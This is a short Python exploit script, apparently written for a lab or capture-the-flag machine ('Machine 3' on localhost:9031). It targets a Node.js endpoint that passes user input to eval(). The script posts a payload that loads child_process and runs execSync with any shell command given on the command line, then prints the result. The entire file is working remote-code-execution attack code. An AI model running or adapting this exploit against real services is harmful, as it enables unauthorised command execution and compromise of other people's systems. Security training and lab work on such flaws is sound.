#!/usr/bin/env python3
"""
Machine 3 - Node.js eval() RCE Exploit
Target: http://localhost:9031/api/execute
Vulnerability: Arbitrary code execution via eval()
"""

import requests
import json
import sys

TARGET = "http://localhost:9031"

def exploit(cmd):
    """Exploit Node.js eval() to execute system commands"""
    # Use child_process to execute system commands
    payload = f"""
    const {{ execSync }} = require('child_process');
    return execSync('{cmd}').toString();
    """
    
    try:
        response = requests.post(
            f"{TARGET}/api/execute",
            json={"code": payload},
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        data = response.json()
        return data.get("result") or data.get("error", "No output")
    except requests.RequestException as e:
        return f"Error: {e}"
    except json.JSONDecodeError:
        return response.text

def main():
    print("[*] Machine 3 - Node.js eval() RCE Exploit")
    print(f"[*] Target: {TARGET}")
    print("-" * 50)
    
    if len(sys.argv) > 1:
        cmd = " ".join(sys.argv[1:])
    else:
        cmd = "id"
    
    print(f"[+] Executing command: {cmd}")
    print("-" * 50)
    
    result = exploit(cmd)
    print(result)

if __name__ == "__main__":
    main()
